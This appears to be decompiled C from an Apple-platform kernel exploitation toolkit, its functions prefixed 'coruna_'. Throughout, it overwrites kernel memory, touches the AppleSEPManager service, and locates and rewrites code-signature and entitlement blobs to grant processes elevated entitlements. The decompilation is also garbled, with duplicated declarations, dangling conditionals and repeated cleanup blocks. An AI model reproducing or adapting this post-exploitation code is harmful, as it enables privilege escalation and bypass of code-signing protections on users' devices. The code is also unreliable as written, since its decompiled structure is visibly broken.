        ctx_val = coruna_fn_ptr_cast_2(arg,thread_attr[2]);
        if ((ctx_val != 0) && (ctx_val = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6_2(arg,thread_attr[2] + 0x10,0), ctx_val != 0)) {
          if (((thread_attr[2] + 0x10 ^ thread_attr[2] + 0x78) &
              (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) == 0) {
            scratch = ctx_val + 0x68;
          }
          else {
            scratch = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6_2(arg,thread_attr[2] + 0x78,0);
            if (*(long *)k_kernel_stack_chk_guard_slot != cache_28) {
            ___stack_chk_fail();
            }
            return;
          }
          host_info = 0;
          if ((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003) || ((*arg >> 5 & 1) == 0)) {
            status = coruna_vm_deallocate_2cb98(arg,ctx_val,&host_info,4);
          }
          else {
            status = coruna_kernel509_via_mach_port_deallocate_2b24c_3(arg,ctx_val,&host_info,4,0);
          }
          if ((((status == 0) && (status = coruna_kernel509_via_mach_vm_read_overwrite_3(arg,val,8,&bootargs,0), status != 0))
              && (status = coruna_kernel509_via_vm_deallocate_2cb98(arg,scratch,bootargs - handle), status == 0)) &&
             (status = coruna_kernel509_via_vm_deallocate_2cb98(arg,serial_7,val), status == 0)) {
            thread_attr[0] = size;
            _IOConnectCallScalarMethod(err,10,thread_attr,1,0,0);
            coruna_kernel509_via_vm_deallocate_2cb98(arg,serial_7,serial);
          }
        }
      }
    }
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_28) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_kernel509_via_vm_deallocate_2cb98(byte *arg,uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  
  scratch = id_2;
  if ((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003) || ((*arg >> 5 & 1) == 0)) {
    coruna_vm_deallocate_2cb98(arg,val,&scratch,8);
  }
  else {
    coruna_kernel509_via_mach_port_deallocate_2b24c_3(arg,val,&scratch,8,0);
  }
  return;
}
void coruna_vm_deallocate_2cb98(uint64_t val,unsigned long arg,uint64_t *id_2,uint size)
{
  int err;
  vm_size_t size;
  unsigned long u;
  void *scratch;
  
  scratch = (void *)0x0;
  size = *(vm_size_t *)k_kernel_vm_page_size_slot;
  if (arg + size <= (-size & arg) + size) {
    u = *(unsigned long *)k_kernel_vm_page_mask_slot;
    err = coruna_vm_map_28574(val,&scratch,size,arg);
    if (err == 0) {
      if (size == 8) {
        *(uint64_t *)((long)scratch + (u & arg)) = *id_2;
      }
      else if (size == 4) {
        *(uint32_t *)((long)scratch + (u & arg)) = *(uint32_t *)id_2;
      }
      else {
        _memcpy(scratch,id_2,(unsigned long)size);
      }
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t)scratch,size);
    }
  }
  return;
}
void coruna_open_sepmgr_2ccac(long handle,uint64_t val,uint64_t id_2)
{
  long handle;
  int err;
  long addr;
  unsigned long u;
  long scratch;
  
  u = (unsigned long)*(uint *)(handle + 0x10);
  if (*(uint *)(handle + 0x10) + 1 < 2) {
    u = coruna_ioservicegetmatchingservice_1a3ec("AppleSEPManager");
    if ((int)u + 1U < 2) {
      return;
    }
    *(int *)(handle + 0x10) = (int)u;
  }
  addr = *(long *)(handle + 0x18);
  if (addr == 0) {
    addr = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,u);
    if (addr == 0) {
      return;
    }
    *(long *)(handle + 0x18) = addr;
  }
  handle = *(long *)(handle + 0x20);
  if (*(long *)(handle + 0x20) == 0) {
    err = coruna_kernel509_residual_307(handle,addr + 0x28,&scratch);
    if (err == 0) {
      return;
    }
    *(long *)(handle + 0x20) = scratch;
    handle = scratch;
  }
  scratch = handle;
  err = coruna_mach_vm_machine_attribute_2b20c(handle,addr + 0x28,val,0);
  if (err != 0) {
    err = __IOServiceSetAuthorizationID(u,id_2);
    if ((err != 0) && (err == 0x35)) {
      if (*(char *)(handle + 0xc) == '\0') {
        err = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
      }
      else {
        *(uint8_t *)(handle + 0xc) = 0;
        err = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
        *(uint8_t *)(handle + 0xc) = 1;
      }
      if (err == 0) {
        __IOServiceSetAuthorizationID(u,id_2);
      }
    }
    coruna_mach_vm_machine_attribute_2b20c(handle,addr + 0x28,scratch,0);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_7(long handle,uint64_t val,long *addr_2,byte arg,long *off_3)
{
  uint64_t u;
  unsigned long size;
  unsigned long *ptr;
  unsigned long version;
  int err;
  long handle;
  long addr;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long sa_saved;
  unsigned long sa_new;
  unsigned long thread_attr;
  unsigned long host_info;
  unsigned long path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t url_buf;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  handle = coruna_helper_16fd0_34c1c();
  addr = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
  return;
  }
  ___stack_chk_fail(addr);
}
void coruna_kernel5_residual_260(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  uint32_t u;
  uint32_t size;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      size = 0x240;
      u = 0x238;
    }
    else if (err == 0x1c1b) {
      size = 0x228;
      u = 0x220;
    }
    else {
      if (err != 0x1f53) {
        return;
      }
      u = 0x358;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2a8;
      }
      size = 0x360;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x2b0;
      }
    }
  }
  else if (err < 0x225c) {
    if (err != 0x1f54 && err != 0x2258) {
      return;
    }
    size = 0x358;
    u = 0x350;
  }
  else {
    if (err != 0x225c && err != 0x2712) {
      return;
    }
    size = 0x550;
    u = 0x548;
  }
  *size = u;
  *flags_2 = size;
  return;
}
void coruna_kernel5_residual_261(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  bool err;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (size != (uint32_t *)0x0) {
      *size = 0x78;
    }
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = 0x50;
    }
  }
  return;
}
void coruna_cc_sha256_update(int flags,void *ctx,CC_LONG arg,void *scratch,uint *size)
{
  uint u;
  CC_SHA512_CTX CStack_148;
  uchar scratch [48];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0x14;
  if (flags < 3) {
    if (flags != 1) {
      if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
      ___stack_chk_fail();
      }
      return;
    }
  }
  else if (flags != 3) {
    if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
    ___stack_chk_fail();
    }
    return;
  }
  if (u <= *size) {
    if (flags - 2U < 2) {
      _CC_SHA256_Init((CC_SHA256_CTX *)&CStack_148);
      _CC_SHA256_Update((CC_SHA256_CTX *)&CStack_148,ctx,arg);
      _CC_SHA256_Final(scratch,(CC_SHA256_CTX *)&CStack_148);
    }
    else if (flags == 4) {
      _CC_SHA384_Init(&CStack_148);
      _CC_SHA384_Update(&CStack_148,ctx,arg);
      _CC_SHA384_Final(scratch,&CStack_148);
    }
    else {
      if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
      ___stack_chk_fail();
      }
      return;
    }
    _memcpy(scratch,scratch,(unsigned long)u);
    *size = u;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_cfrelease(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 long *handle,uint64_t *off_5,uint64_t off_6)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t scratch;
  
  handle = coruna_cfreadstreamcreatewithbytesnocopy();
  if (handle != 0) {
    addr = coruna_cfreadstreamcreatewithbytesnocopy(size_3,off_4);
    if (addr != 0) {
      err = coruna_kernel509_via_cfdictionaryapplyfunction(handle,addr,off_6);
      if ((err != 0) && (off = coruna_cfpropertylistcreatedata(handle,&scratch), off != 0)) {
        *off_5 = scratch;
        *handle = off;
      }
      _CFRelease(handle);
      handle = addr;
    }
    _CFRelease(handle);
  }
  return;
}
void coruna_cfreadstreamcreatewithbytesnocopy(uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFReadStreamCreateWithBytesNoCopy
                    (u,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
  if (handle == 0) {
    return;
  }
  err = _CFReadStreamOpen();
  _CFRelease(handle);
  return;
}
void coruna_kernel509_via_cfdictionaryapplyfunction(uint64_t val,uint64_t id_2,uint8_t *buf)
{
  int err;
  
  if (buf != (uint8_t *)0x0) {
    err = coruna_cfdictionaryapplyfunction_150e8(val,id_2);
    if (err == 0) {
      *buf = 1;
      return;
    }
    *buf = 0;
  }
  coruna_cfdictionaryapplyfunction(val,id_2);
  return;
}
void coruna_cfpropertylistcreatedata(uint64_t val,size_t *len)
{
  long handle;
  size_t ls2;
  void *ptr;
  void *buf;
  long scratch;
  
  scratch = 0;
  handle = _CFPropertyListCreateData
                    (*(uint64_t *)k_kernel_kcfallocatordefault_slot,val,100,0,&scratch);
  if (handle == 0) {
    handle = scratch;
    if (scratch == 0) {
      return;
    }
  }
  else {
    ls2 = _CFDataGetLength();
    if ((ls2 != 0) && (ptr = _malloc(ls2), ptr != (void *)0x0)) {
      buf = (void *)_CFDataGetBytePtr(handle);
      _memcpy(ptr,buf,ls2);
      *len = ls2;
    }
  }
  _CFRelease(handle);
  return;
}
void coruna_plist_dict(uint *size,uint64_t val,uint64_t *id_2)
{
  uint32_t u;
  uint size;
  uint version;
  uint port;
  bool err;
  uint64_t tag;
  uint64_t kind;
  char err;
  int err;
  long handle;
  long addr;
  void *ptr;
  void *buf;
  size_t ls15;
  uint64_t type_id;
  unsigned long type_id_8;
  char *ptr;
  char *buf;
  unsigned long type_id_9;
  unsigned long type_id_10;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  char *thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  unsigned long action;
  unsigned long block_ctx;
  char *stack_guard;
  uint type_id_11;
  
  err = coruna_kernel509_via_kernel5_residual_262_3(size,val,0,1,&scratch);
  if ((err == 0) && (err = coruna_kernel509_via_kernel5_residual_262_3(size,val,0,0,&scratch), err == 0)) {
    return;
  }
  type_id_8 = *(unsigned long *)(size + 0x56);
  if ((0x1c1b19145fffff < type_id_8) && ((*size & 0x5584001) != 0 || 0x1f52ffffffffff < type_id_8)) {
    serial_buf = coruna_u64_pack71((serial_buf), (1));
  }
  if ((unsigned long)thread_attr >> 0x1d != 0) {
    handle = coruna_helper_16fd0_34c1c(size,host_info);
    if ((handle != 0) && (err = coruna_kernel5_residual_260(size,&block_ctx,&action), err != 0)) {
      handle = handle + (action & 0xffffffff);
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(size,handle,8,&stack_guard);
      coruna_kernel509_via_kernel5_via_bzero_5(&scratch);
      return;
    }
    coruna_kernel509_via_kernel5_via_bzero_5(&scratch);
    return;
  }
  handle = coruna_kernel5_residual_262(&scratch,host_info & 0xffffffff,0xfade0c02);
  coruna_kernel509_via_kernel5_via_bzero_5(&scratch);
  return;
}
void coruna_kernel5_residual_262(long handle,int flags,uint size)
{
  uint u;
  unsigned long size;
  uint64_t *ptr;
  
  if (((handle != 0) && (*(int *)(handle + 0x30) != 0)) && (*(int *)(handle + 0x30) == 1)) {
    u = **(uint **)(handle + 0x38);
    size = (unsigned long)u;
    if (u != 0) {
      ptr = (uint64_t *)(*(long *)(*(uint **)(handle + 0x38) + 2) + 8);
      do {
        if ((*(int *)(ptr + -1) == flags) &&
           (u = (*(uint *)*ptr & 0xff00ff00) >> 8 | (*(uint *)*ptr & 0xff00ff) << 8,
           (u >> 0x10 | u << 0x10) == size)) {
          return;
        }
        ptr = ptr + 2;
        size = size - 1;
      } while (size != 0);
    }
  }
  return;
}
void coruna_kernel509_via_memcpy_21a64(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  long addr;
  uint64_t u;
  
  handle = coruna_kernel5_residual_264(val,id_2,0xfade0c02);
  if ((handle != 0) && (addr = coruna_memcpy_21a64(size_3), addr != 0)) {
    u = *(uint64_t *)(handle + 8);
    *(long *)(handle + 8) = addr;
    coruna_bzero(u);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_16(long handle,uint64_t val)
{
  int err;
  long scratch;
  uint64_t scratch;
  uint32_t bootargs;
  
  bootargs = 0;
  scratch = handle;
  scratch = val;
  if ((*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) ||
     (err = coruna_fn_ptr_cast_10(handle,4), err != 0)) {
    coruna_pthread_create_suspended_np(&scratch);
  }
  else {
    err = coruna_fn_ptr_cast_10(handle,0x5584001);
    if ((err == 0) || (0x1c1b1e025fffff < *(unsigned long *)(handle + 0x158))) {
      coruna_pthread_join_2c6d8(handle,coruna_pthread_create_suspended_np,&scratch);
    }
    else {
      coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b508_2(handle,coruna_pthread_create_suspended_np,&scratch);
    }
  }
  return;
}
void coruna_kernel509_via_kernel5_via_bzero_5(long handle)
{
  if (*(int *)(handle + 0x30) == 0) {
    coruna_bzero(*(uint64_t *)(handle + 0x38));
  }
  else if (*(int *)(handle + 0x30) == 1) {
    coruna_kernel5_via_bzero_5(*(uint64_t *)(handle + 0x38));
  }
  *(uint64_t *)(handle + 0x38) = 0;
  *(uint32_t *)(handle + 0x30) = 0xffffffff;
  return;
}
void coruna_cfdatagetbyteptr(uint *size,uint64_t val,char *path,unsigned long arg)
{
  unsigned long u;
  uint size;
  bool err;
  bool status;
  int err;
  size_t ls6;
  long handle;
  long addr;
  uint64_t version;
  unsigned long port;
  void *ptr;
  uint64_t tag;
  long scratch;
  char bootargs;
  int thread_attr;
  uint32_t scratch;
  void *host_info;
  uint8_t serial_buf[64];
  uint32_t action;
  char block_ctx;
  uint8_t stack_guard;
  
  host_info = (void *)0x0;
  bootargs = '\0';
  scratch = 0;
  err = coruna_plist_dict(size,val,serial_buf);
  if (err == 0) {
    return;
  }
  port = *(unsigned long *)(size + 0x56);
  if ((port < 0x1c1b1914600000) || ((*size & 0x5584001) == 0 && port < 0x1f530000000000)) {
    status = false;
    err = (arg & 1) == 0;
fail:
    handle = coruna_kernel5_residual_262(serial_buf,5,0xfade7171);
    if (handle == 0) {
      if ((*size & 0x5584001) == 0) {
        ls6 = _strlen(path);
        if (status) {
          err = coruna_load_core_entitlements_2eabc(path,ls6,&scratch);
          if (err != 0) {
            version = _CFDataGetBytePtr(scratch);
            tag = _CFDataGetLength(scratch);
            err = coruna_kernel509_str_2b_09_40_b9_4b_39_0b_8b(serial_buf,7,0xfade7172,version,tag);
            if ((err != 0) && (err = coruna_kernel509_via_kernel5_residual_262_2(serial_buf,7), err != 0)) {
              tag = 0xfade7172;
              version = 7;
              err = coruna_kernel509_via_kernel5_residual_262(serial_buf,version,tag);
              if (err != 0) {
              err = coruna_kernel509_via_fn_ptr_cast_10_16(size,serial_buf);
              status = err == 0;
              ptr = host_info;
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
              if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
              coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              return;
              }
              }
              else {
              status = false;
              ptr = host_info;
              if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
              if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
              coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              return;
            }
          }
        }
        else {
          err = coruna_kernel509_str_2b_09_40_b9_4b_39_0b_8b(serial_buf,5,0xfade7171,path);
          version = 5;
          tag = 0xfade7171;
          err = coruna_kernel509_via_kernel5_residual_262(serial_buf,version,tag);
          if (err != 0) {
          err = coruna_kernel509_via_fn_ptr_cast_10_16(size,serial_buf);
          status = err == 0;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
          if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
          coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          return;
          }
          }
          else {
          status = false;
          ptr = host_info;
          if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
          if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
          coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          return;
        }
      }
    }
    else {
      size = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
      port = (unsigned long)(size >> 0x10 | size << 0x10) - 8;
      ls6 = _strlen(path);
      err = coruna_cfrelease((void *)(handle + 8),port,path,ls6,&host_info,&thread_attr,&bootargs);
      if (err != 0) {
        if (bootargs != '\0') {
          if (0x1f52ffffffffff < *(unsigned long *)(size + 0x56) && !err) {
            err = coruna_kernel509_residual_311(size,serial_buf,val,&bootargs);
            if (err == 0) goto check_ok;
            if (bootargs == '\0') goto skip;
          }
next:
          status = false;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
          if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
          coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          return;
        }
skip:
        ptr = host_info;
        if ((block_ctx != '\0') || ((*size & 0x5584001) == 0)) {
          err = coruna_kernel509_via_kernel5_residual_264(serial_buf,5,0xfade7171,host_info,thread_attr);
          if (err == 0) goto retry;
cleanup:
          version = 5;
          tag = 0xfade7171;
          err = coruna_kernel509_via_kernel5_residual_262(serial_buf,version,tag);
          if (err != 0) {
          err = coruna_kernel509_via_fn_ptr_cast_10_16(size,serial_buf);
          status = err == 0;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
          if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
          coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          return;
          }
          }
          else {
          status = false;
          ptr = host_info;
          if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
          if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
          coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          return;
        }
        addr = coruna_kernel5_residual_262(serial_buf,action,0xfade0c02);
        if (addr != 0) {
          size = *(uint *)(addr + 0x28);
          if (size != 0) {
            u = port;
            if (port <= (unsigned long)size - 8) {
              u = (unsigned long)size - 8;
            }
            if ((size & 0x3fff) != 0) {
              u = port;
            }
            port = coruna_u64_pack((scratch), (thread_attr));
            if (port <= u) {
              _memcpy((void *)(handle + 8),host_info,port);
              _bzero((void *)(handle + port + 8),u - port);
              size = (thread_attr + 8U & 0xff00ff00) >> 8 | (thread_attr + 8U & 0xff00ff) << 8;
              *(uint *)(handle + 4) = size >> 0x10 | size << 0x10;
              version = 5;
              tag = 0xfade7171;
              err = coruna_kernel509_via_kernel5_residual_262(serial_buf,version,tag);
              if (err != 0) {
              err = coruna_kernel509_via_fn_ptr_cast_10_16(size,serial_buf);
              status = err == 0;
              ptr = host_info;
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
              if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
              coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              return;
              }
              }
              else {
              status = false;
              ptr = host_info;
              if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
              if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
              coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              return;
            }
          }
        }
      }
    }
  }
  else {
    block_ctx = '\x01';
    err = (arg & 1) == 0;
    if ((port < 0x1f530000000000) || ((arg & 1) == 0)) {
      if (port < 0x1f530000000000) {
        status = false;
        goto fail;
      }
    }
    else {
      stack_guard = 1;
    }
    handle = coruna_kernel5_residual_262(serial_buf,7,0xfade7172);
    if (handle == 0) {
      status = true;
      goto fail;
    }
    size = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
    err = coruna_load_core_entitlements(handle + 8,(unsigned long)(size >> 0x10 | size << 0x10) - 8,path,&host_info,
                         &thread_attr,&bootargs);
    if (err != 0) {
      if (bootargs == '\0') {
found:
        ptr = host_info;
        tag = 0xfade7172;
        err = coruna_kernel509_via_kernel5_residual_264(serial_buf,7,0xfade7172,host_info,thread_attr);
        if (err == 0) {
retry:
          status = true;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
          if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
          coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          return;
        }
        version = 7;
done:
        err = coruna_kernel509_via_kernel5_residual_262(serial_buf,version,tag);
        if (err != 0) {
          err = coruna_kernel509_via_fn_ptr_cast_10_16(size,serial_buf);
          status = err == 0;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
          if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
          coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          return;
        }
      }
      else {
        status = false;
        ptr = host_info;
        if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
        if (ptr != (void *)0x0) {
        _free(ptr);
        }
        if (scratch != 0) {
        _CFRelease();
        }
        coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
        if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
        coruna_cfpropertylistcreatewithdata(size,val,path,0);
        }
        return;
      }
    }
  }
  status = true;
  ptr = host_info;
joined_r0x0002e450:
  if (ptr != (void *)0x0) {
    _free(ptr);
  }
  if (scratch != 0) {
    _CFRelease();
  }
  coruna_kernel509_via_kernel5_via_bzero_5(serial_buf);
  if ((!status) && (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err)) {
    coruna_cfpropertylistcreatewithdata(size,val,path,0);
  }
  return;
}
void coruna_load_core_entitlements(uint64_t val,uint64_t id_2)
{
  long handle;
  long addr;
  uint64_t *ptr;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  handle = _dlopen("/usr/lib/libCoreEntitlements.dylib",1);
  if (((handle != 0) && (addr = _dlsym(handle,"kCENoError"), addr != 0)) &&
     (ptr = (uint64_t *)_dlsym(handle,"CECRuntime"), ptr != (uint64_t *)0x0)) {
    u = *ptr;
    addr = _dlsym(handle,"CEManagedContextFromCFData");
    if ((((addr != 0) && (addr = _dlsym(handle,"CEQueryContextToCFDictionary"), addr != 0)) &&
        ((addr = _dlsym(handle,"CESerializeCFDictionary"), addr != 0 &&
         ((addr = _dlsym(handle,"CEReleaseManagedContext"), addr != 0 &&
          (addr = _dlsym(handle,"CEGetErrorString"), addr != 0)))))) &&
       (addr = _CFDataCreateWithBytesNoCopy
                          (*(uint64_t *)k_kernel_kcfallocatordefault_slot,val,id_2,
                           *(uint64_t *)k_kernel_kcfallocatornull_slot), addr != 0)) {
      coruna_kernel509_via_helper_5d2c_419fc_2(u,addr,&scratch);
    }
  }
  if (thread_attr != 0) {
    _CFRelease();
  }
  if (bootargs != 0) {
    _CFRelease();
  }
  if (scratch == 0) {
    if (handle != 0) {
      _dlclose(handle);
    }
    return;
  }
  coruna_kernel509_via_helper_5d2c_419fc_2(&scratch);
}
void coruna_kernel509_residual_311(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  long handle;
  long addr;
  int err;
  unsigned long u;
  long scratch;
  
  u = *(unsigned long *)(handle + 0x158);
  handle = 0x98;
  if (u < 0x1c1b1914600000) {
    handle = 0x90;
  }
  addr = 0xa8;
  if (u < 0x1f530000000000) {
    addr = handle;
  }
  handle = 0xa0;
  if (u < 0x1f530f02800000) {
    handle = addr;
  }
  err = coruna_kernel509_residual_307(handle,*(long *)(addr_2 + 8) + handle,&scratch);
  if ((err != 0) && (err = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_12(handle,val), err != 0)) {
    *(bool *)id_2 = scratch == *(long *)(handle + 0x390);
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_264(uint64_t val,uint64_t id_2,uint size,void *ctx,unsigned long arg)
{
  size_t ls1;
  uint u;
  long handle;
  uint *ptr;
  uint64_t size;
  uint version;
  
  handle = coruna_kernel5_residual_264();
  if (handle != 0) {
    ls1 = (arg & 0xffffffff) + 8;
    ptr = _malloc(ls1);
    if (ptr != (uint *)0x0) {
      u = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      version = (uint)ls1;
      version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
      *ptr = u >> 0x10 | u << 0x10;
      ptr[1] = version >> 0x10 | version << 0x10;
      _memcpy(ptr + 2,ctx,arg & 0xffffffff);
      size = *(uint64_t *)(handle + 8);
      *(uint **)(handle + 8) = ptr;
      coruna_bzero(size);
    }
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_262(long handle,uint size)
{
  uint u;
  long handle;
  long addr;
  uint64_t size;
  void *ptr;
  uint scratch;
  uint8_t bootargs[48];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_kernel5_residual_262();
  addr = coruna_kernel5_residual_262(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
  return;
  }
  ___stack_chk_fail(size);
}
void coruna_load_core_entitlements_2eabc(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  long addr;
  uint64_t *ptr;
  long off;
  uint64_t u;
  uint64_t size;
  
  handle = _dlopen("/usr/lib/libCoreEntitlements.dylib",1);
  if (handle != 0) {
    addr = _dlsym(handle,"kCENoError");
    if ((addr != 0) &&
       (ptr = (uint64_t *)_dlsym(handle,"CECRuntime"), ptr != (uint64_t *)0x0)) {
      u = *ptr;
      addr = _dlsym(handle,"CESerializeCFDictionary");
      if ((addr != 0) && (addr = _dlsym(handle,"CEGetErrorString"), addr != 0)) {
        size = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
        addr = _CFDataCreateWithBytesNoCopy
                          (size,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
        if (addr != 0) {
          off = _CFPropertyListCreateWithData(size,addr,0,0,0);
          if (off != 0) {
            coruna_kernel509_via_helper_5d2c_419fc_2(u,off,size_3);
          }
          _CFRelease(addr);
        }
      }
    }
    _dlclose(handle);
  }
  return;
}
